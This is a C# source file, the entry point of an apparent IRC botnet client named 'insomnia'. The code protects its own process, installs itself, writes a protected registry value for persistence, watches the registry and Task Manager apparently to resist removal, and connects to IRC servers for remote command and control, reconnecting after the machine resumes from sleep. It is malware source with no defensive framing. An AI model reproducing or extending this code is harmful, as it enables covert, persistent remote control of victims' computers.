using System;
using System.Collections.Generic;
using System.Text;
using System.Diagnostics;
using System.Threading;
using System.IO;
using Microsoft.Win32;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Reflection;
using System.Runtime.InteropServices;

#region Assembly
[assembly: AssemblyTitle("")]
[assembly: AssemblyDescription("")]
[assembly: AssemblyConfiguration("")]
[assembly: AssemblyCompany("")]
[assembly: AssemblyProduct("")]
[assembly: AssemblyCopyright("")]
[assembly: AssemblyTrademark("")]
[assembly: AssemblyCulture("")]
[assembly: ComVisible(false)]
[assembly: Guid("00000000-0000-0000-0000-000000000000")]
[assembly: AssemblyVersion("1.0.0.0")]
[assembly: AssemblyFileVersion("1.0.0.0")]
#endregion

namespace insomnia
{
    internal class Program
    {
        public static bool persistMon = true;
        private static string installDir = Environment.GetEnvironmentVariable(Config._installEnv());

        public static void Main()
        {
            Functions.ProtectProc();
            // Mutex for single instance


            bool ok;
            Config.mutex = new Mutex(true, Config.BotMutex(), out ok);
            if (!ok) // Already running then exit
                Environment.Exit(0);

            // Check installation, if not then install
            if (!Install.IsInstalled())
            {
                Install.Start();
            }

            // Check registry key
            RegTools.CreateProtectedValue();

            if (Functions.RegistryPath().GetValue(Config._registryKey()) == null)
                Functions.RegistryPath().SetValue(Config._registryKey(), Config.currentPath);


            // Start monitoring the registry for changes
            Thread regMon = new Thread(Functions.RegistryMonitor);
            regMon.IsBackground = true;
            regMon.Start();

            // Register event handlers for system shutdown/sleep
            SystemEvents.PowerModeChanged += PowerModeChanged;
            SystemEvents.SessionEnding += SessionEnding;

            // Start TaskMan Monitor
            new Thread(TaskManager.Monitor).Start();
            
            // Finally, connect to IRC.
            Thread irc = new Thread(() => IRC.Connect(Config._servers(), Config._mainChannel(), Config._key(), Config._port(), Config._authHost()));
            irc.Start();
        }

        private static void PowerModeChanged(object sender, PowerModeChangedEventArgs e)
        {
            try
            {
                switch (e.Mode)
                {
                    case Microsoft.Win32.PowerModes.Resume:
                        IRC.Connect(Config._servers(), Config._mainChannel(), Config._key(), Config._port(), Config._authHost());
                        break;

                    case Microsoft.Win32.PowerModes.Suspend:
                        IRC.Disconnect("Windows is going to sleep...");
                        break;
                }
            }
            catch
            {
            }
        }
        private static void SessionEnding(object sender, SessionEndingEventArgs e)
        {
            try
            {
                switch (e.Reason)
                {
                    case Microsoft.Win32.SessionEndReasons.Logoff:
                        IRC.Disconnect("Windows is logging off...");
                        break;

                    case Microsoft.Win32.SessionEndReasons.SystemShutdown:
                        IRC.Disconnect("Windows is shutting down...");
                        break;
                }
            }
            catch
            {
            }
        }
    }
}
